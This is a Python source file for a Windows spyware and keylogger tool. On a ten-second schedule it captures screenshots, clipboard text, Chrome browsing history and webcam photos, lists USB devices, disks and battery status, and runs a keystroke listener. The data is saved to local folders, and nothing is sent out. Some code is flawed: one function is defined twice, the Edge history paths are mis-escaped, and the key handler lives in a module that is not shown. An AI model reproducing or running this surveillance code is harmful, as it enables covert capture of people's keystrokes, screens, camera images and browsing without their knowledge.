
from pynput.keyboard import Listener
import press
import time
import threading
import schedule
import queue
from PIL import ImageGrab 
import os,sys,subprocess
import shutil
import sqlite3
import win32clipboard
import cv2
import psutil 
from psutil._common import bytes2human


current_dir = os.getcwd()
dirs = {
    'output_dir':'output',
    'browser_dir': 'output/browser_history',
    'scr_dir': 'output/scr'
}
for value in dirs.values():
    if not os.path.exists(value):
        os.mkdir(value)

parse_cache = None

def takeScr():
    img = ImageGrab.grab()
    print(img)
    timestr = time.strftime("%Y%m%d-%H%M%S")
    img.save(f'{current_dir}\output\scr\scr_{timestr}.png')

def takeClip():
    win32clipboard.OpenClipboard()
    global parse_cache
    pasted_data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    if parse_cache != pasted_data:
        parse_cache = pasted_data
        with open(f'{current_dir}\output\clip.txt', 'a+', encoding='utf-8') as clip:
            clip.write(pasted_data+'\n')
 
def secs2hours(secs):
    mm, ss = divmod(secs, 60)
    hh, mm = divmod(mm, 60)
    return "%d:%02d:%02d" % (hh, mm, ss)  

def getBtryPerformance():
    battery = psutil.sensors_battery()
    print("Battery:")
    print("    charge:     %s%%" % round(battery.percent, 2))
    
    if battery.power_plugged:
        print("    status:     %s" % (
                "charging" if battery.percent < 100 else "fully charged"))
        print("    plugged in: yes")
    else:
            print("    left:       %s" % secs2hours(battery.secsleft))
            print("    status:     %s" % "discharging")
            print("    plugged in: no")

def disk_usage():
    templ = "%-17s %8s %8s %8s %5s%% %9s  %s"
    print(templ % ("Device", "Total", "Used", "Free", "Use ", "Type",
                   "Mount"))

    for part in psutil.disk_partitions(all=False):
        usage = psutil.disk_usage(part.mountpoint)
        print(templ % (
            part.device,
            bytes2human(usage.total),
            bytes2human(usage.used),
            bytes2human(usage.free),
            int(usage.percent),
            part.fstype,
            part.mountpoint))

def usb():
    p = subprocess.Popen(["powershell.exe", 
              " Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], 
              stdout=sys.stdout)
    p.communicate()  

def disk_usage():
    templ = "%-17s %8s %8s %8s %5s%% %9s  %s"
    print(templ % ("Device", "Total", "Used", "Free", "Use ", "Type",
                   "Mount"))

    for part in psutil.disk_partitions(all=False):
        usage = psutil.disk_usage(part.mountpoint)
        print(templ % (
            part.device,
            bytes2human(usage.total),
            bytes2human(usage.used),
            bytes2human(usage.free),
            int(usage.percent),
            part.fstype,
            part.mountpoint))

def browser_history():
    username = os.getlogin()
    g_path = f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
    e_path = f'C:\\Users\{username}\\AppData\\Local\Microsoft\\Edge\\User Data\\Default\\History'

    g_dst =f'{current_dir}/output/browser_history/chrome'
    e_dst = f'{current_dir}/output/browser_history/edge'

    browsers_db = shutil.copy2(g_path,g_dst)
    
    con = sqlite3.connect(browsers_db)
    cursor = con.cursor()
    cursor.execute("SELECT title FROM urls")
    urls = cursor.fetchall()
    for i in urls[-5:]:
        print(i)

def webcam():
    cam = cv2.VideoCapture(0)
    timestr = time.strftime("%Y%m%d-%H%M%S")

    for i in range(1,4):
        ret, img = cam.read()

        if ret:
            cv2.imwrite(f'{current_dir}\\output\\cam_{timestr}_{i}.jpg', img)

    time.sleep(1)
    cam.release()

def log_keys():
    with Listener(on_release = press.on_press) as listener:
        listener.join()

def worker_main():
    while 1:
        job_func = jobqueue.get()
        job_func()
        jobqueue.task_done()

if __name__ == '__main__':

    jobqueue = queue.Queue()

    schedule.every(10).seconds.do(jobqueue.put, takeScr)
    schedule.every(10).seconds.do(jobqueue.put, takeClip)
    schedule.every(10).seconds.do(jobqueue.put, browser_history)
    schedule.every(10).seconds.do(jobqueue.put, usb)
    schedule.every(10).seconds.do(jobqueue.put, disk_usage)
    schedule.every(10).seconds.do(jobqueue.put, getBtryPerformance)
    schedule.every(10).seconds.do(jobqueue.put, webcam)
    
    schedular_thread = threading.Thread(target=worker_main)
    schedular_thread.start()
    key_thread = threading.Thread(target=log_keys,daemon=True).start()
    while 1:
        schedule.run_pending()
        time.sleep(1)
